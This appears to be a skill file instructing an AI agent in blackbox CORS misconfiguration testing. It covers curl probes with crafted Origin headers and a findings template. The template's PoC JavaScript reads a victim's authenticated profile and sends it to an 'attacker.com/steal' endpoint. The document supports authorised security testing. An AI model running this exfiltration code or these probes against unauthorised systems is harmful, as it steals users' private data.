---
name: blackbox-cors
description: >-
  Actively test a target web application for CORS (Cross-Origin Resource
  Sharing) misconfiguration vulnerabilities using blackbox techniques. Reads
  pentest/target-map.md, injects crafted Origin headers into API endpoints,
  checks for wildcard or reflected origin in Access-Control-Allow-Origin,
  tests for credentialed CORS, null origin acceptance, and subdomain trust.
  Writes confirmed findings with PoC JavaScript to pentest/cors-results.md.
  Use when asked to find CORS misconfigurations in a blackbox pentest.
---

# Blackbox CORS Misconfiguration Detection

You are actively testing a web application for CORS misconfigurations without source code access. A misconfigured CORS policy can allow a malicious website to read authenticated responses from the target.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## What Makes CORS Exploitable

CORS misconfiguration is exploitable when ALL three conditions are met:
1. `Access-Control-Allow-Origin` reflects the attacker's origin (or is wildcard)
2. `Access-Control-Allow-Credentials: true` is set
3. The endpoint returns sensitive data when authenticated

(Wildcard + credentials is never allowed by spec — browsers block it. But reflected origin + credentials is a critical vulnerability.)

---

## Phase 1: Test Each API Endpoint

For every API endpoint in `pentest/target-map.md`, send requests with crafted Origin headers.

### Test 1: Arbitrary Origin Reflection

```bash
# Send an arbitrary attacker origin
curl -sk -X GET "<TARGET_URL>/api/me" \
  -H "Origin: https://attacker.com" \
  -H "Authorization: Bearer <TOKEN>" \
  -D -

# Check the response headers for:
# Access-Control-Allow-Origin: https://attacker.com  ← VULNERABLE (reflected)
# Access-Control-Allow-Credentials: true             ← makes it exploitable
```

**Confirmed vulnerable** if both headers are present with your injected origin.

### Test 2: Null Origin

```bash
curl -sk "<TARGET_URL>/api/me" \
  -H "Origin: null" \
  -H "Authorization: Bearer <TOKEN>" \
  -D -

# Vulnerable if:
# Access-Control-Allow-Origin: null
# Access-Control-Allow-Credentials: true
```

### Test 3: Subdomain of Target

```bash
# Target is target.com → test evil.target.com
curl -sk "<TARGET_URL>/api/me" \
  -H "Origin: https://evil.target.com" \
  -H "Authorization: Bearer <TOKEN>" \
  -D -

# Target is sub.target.com → test target.com or evil.target.com
curl -sk "<TARGET_URL>/api/me" \
  -H "Origin: https://target.com.attacker.com" \
  -H "Authorization: Bearer <TOKEN>" \
  -D -
```

The last test checks for insecure regex like `*target.com` which would match `attacker.target.com.evil.com`.

### Test 4: HTTP Downgrade

```bash
# If target is HTTPS, test if HTTP origin is trusted
curl -sk "<TARGET_URL>/api/orders" \
  -H "Origin: http://attacker.com" \
  -H "Authorization: Bearer <TOKEN>" \
  -D -
```

### Test 5: Pre-flight Request (OPTIONS)

```bash
curl -sk -X OPTIONS "<TARGET_URL>/api/me" \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: GET" \
  -H "Access-Control-Request-Headers: Authorization" \
  -D -

# Look for:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true
# Access-Control-Allow-Methods: GET, POST, PUT, DELETE
# Access-Control-Allow-Headers: Authorization, Content-Type
```

### Test 6: Wildcard on Sensitive Endpoint

```bash
curl -sk "<TARGET_URL>/api/public-data" \
  -H "Origin: https://attacker.com" \
  -D -

# Wildcard without credentials is Low severity:
# Access-Control-Allow-Origin: *
# But if it exposes internal APIs or user data → Medium
```

---

## Phase 2: Confirm Impact

For each confirmed ACAO + ACAC misconfiguration:

1. Check what data the endpoint returns (user PII, auth tokens, private data)
2. Confirm the endpoint requires authentication (cookie or token)
3. Verify the session cookie has `SameSite=None` or no SameSite (needed for credentialed CORS from cross-origin)

```bash
# See what data the endpoint exposes
curl -sk "<TARGET_URL>/api/me" \
  -H "Authorization: Bearer <TOKEN>"
```

---

## Output Format

Write findings to `pentest/cors-results.md`:

```markdown
# CORS Misconfiguration Assessment Results

## Executive Summary
- Endpoints tested: [N]
- Confirmed CORS (exploitable): [N]
- Wildcard (informational): [N]
- Properly configured: [N]

## Findings

### [CRITICAL] /api/me — Reflected Origin with Credentials

- **Endpoint**: `GET /api/me`
- **Evidence**:
  - Request: `Origin: https://attacker.com`
  - Response: `Access-Control-Allow-Origin: https://attacker.com` + `Access-Control-Allow-Credentials: true`
- **Impact**: Any website can read the victim's authenticated profile data. An attacker can create a malicious page that fetches `/api/me` using the victim's session cookies and exfiltrates the response.
- **Sensitive Data Exposed**: user ID, email, full name, account balance (from response body)
- **PoC JavaScript** (host on attacker.com, victim must be logged in):
  ```javascript
  fetch('https://target.com/api/me', {
    credentials: 'include'
  })
  .then(r => r.json())
  .then(data => {
    // Send to attacker server
    fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
  });
  ```
- **PoC curl**:
  ```bash
  curl -sk "https://target.com/api/me" \
    -H "Origin: https://attacker.com" \
    -H "Cookie: session=<VICTIM_SESSION>" \
    -D -
  # Expected headers:
  # Access-Control-Allow-Origin: https://attacker.com
  # Access-Control-Allow-Credentials: true
  # Body: {"id":1,"email":"victim@company.com","role":"admin",...}
  ```
- **Remediation**: Maintain an explicit allowlist of trusted origins. Never reflect the `Origin` header directly into `ACAO`. Never use `ACAO: *` with `ACAC: true` (browsers block this anyway). Avoid trusting `null` origin.

### [MEDIUM] /api/data — Wildcard CORS

- **Endpoint**: `GET /api/data`
- **Evidence**: `Access-Control-Allow-Origin: *` (no credentials, so not critically exploitable)
- **Impact**: Any website can read this endpoint's response without authentication — check if the data is sensitive
- **Remediation**: Restrict to specific allowed origins if the data is not intended to be publicly readable.
```

---

## Important Reminders

- CORS misconfiguration requires **both** ACAO (reflected origin) **and** ACAC (credentials: true) to be exploitable.
- A wildcard ACAO alone is Low/Informational unless the endpoint returns sensitive unauthenticated data.
- The `null` origin bypass is particularly dangerous because it bypasses allowlists.
- Test every API endpoint — CORS policies can vary per-endpoint.
- Clean up: no recon file created; write directly to `pentest/cors-results.md`.
